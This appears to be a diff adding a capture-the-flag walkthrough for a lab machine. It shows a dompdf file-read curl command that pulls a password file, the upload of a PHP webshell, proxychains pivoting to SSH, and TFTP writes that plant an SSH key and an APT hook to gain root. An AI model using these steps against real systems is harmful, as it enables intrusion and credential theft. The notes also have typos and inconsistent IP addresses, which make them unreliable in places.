@@ -1,0 +1,55 @@
+we look at site sorece code and found ==dom pdf== 0.8 vuln
+
+```
+curl http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd
+```
+
+by which we can read files rce
+
+so we found some creds in ==/etc/apache2/sites-enabled/000-default.conf==
+
+and a hidden directory
+
+the name of the user was like web_dav so we did cadaver and we can upload all files in it
+
+we uploaded ==qsd-php basckdoor from /usr/share/webshell==
+
+we can jump to any directory comforbaly thats why
+
+and found ==wp-config== with creds ..
+
+on doing netstat -tulpn we found ssh 22 internally
+
+so we edited ==/etc/proxychains4 to  http 10.10.10.67 3128 ==  #squid proxy
+
+and did proxycahins4 ssh cobb@127.0.0.1
+
+and logged in
+
+now as root we didnot have root flag..
+
+we did ==nc -zv== to check all the ports open on ip
+
+we did ping on different ip chnaging the last digit and found 198.0.0.1 open with 3 ports
+
+tftpd,and ssh
+
+using tftpd we can upload anything on root
+
+we used it to get crontab from /etc/crontab and found out a crontab runs every 5 mins
+
+```
+ssh-keygen
+tftp 192.168.0.1
+put id_rsa.pub /root/.ssh/authorized_keys
+```
+
+now crontab siad  ==apt-upgrade==
+
+```
+echo 'APT::Update::Pre-Invoke {"chmod 600 /root/.ssh/authorized_keys"};' > rootshell
+tftp 192.168.0.1
+put rootshell /etc/apt/apt.conf.d/rootshell
+```
+
+and we can log in as root using id_rsa
